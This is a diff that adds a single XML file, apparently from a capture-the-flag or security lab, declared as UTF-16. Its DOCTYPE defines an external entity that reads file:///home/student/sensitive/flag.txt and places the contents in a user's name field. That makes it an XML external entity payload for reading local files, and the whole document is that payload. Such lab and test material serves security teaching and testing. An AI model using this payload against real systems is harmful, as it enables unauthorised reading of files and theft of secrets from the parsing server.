@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE users [
+    <!ENTITY xxe SYSTEM "file:///home/student/sensitive/flag.txt">
+]>
+<users>
+    <user>
+        <name>&xxe;</name>
+        <email>utf16@example.com</email>
+    </user>
+</users>
